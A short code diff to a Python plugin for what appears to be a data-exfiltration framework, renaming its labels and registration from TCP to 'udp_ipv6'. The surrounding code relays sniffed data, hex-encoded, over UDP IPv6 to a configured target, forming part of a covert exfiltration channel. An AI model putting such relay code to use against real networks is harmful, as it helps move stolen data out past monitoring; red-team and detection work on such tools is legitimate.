@@ -62,14 +62,14 @@ def relay_tcp_packet(data):
     target = config['target']
     port = config['port']
     app_exfiltrate.log_message(
-        'info', "[proxy] [tcp_ipv6] Relaying {0} bytes to {1}".format(len(data), target))
+        'info', "[proxy] [udp_ipv6] Relaying {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
     client_socket.connect((target, port))
     client_socket.send(hexlify(data.encode()))
     client_socket.close()
 
 def proxy():
-    app_exfiltrate.log_message('info', "[proxy] [tcp_ipv6] Waiting for connections...")
+    app_exfiltrate.log_message('info', "[proxy] [udp_ipv6] Waiting for connections...")
     sniff(handler=relay_tcp_packet)
 
 class Plugin:
@@ -79,4 +79,4 @@ class Plugin:
         global app_exfiltrate
         config = conf
         app_exfiltrate = app
-        app.register_plugin('tcp', {'send': send, 'listen': listen, 'proxy': proxy})
+        app.register_plugin('udp_ipv6', {'send': send, 'listen': listen, 'proxy': proxy})
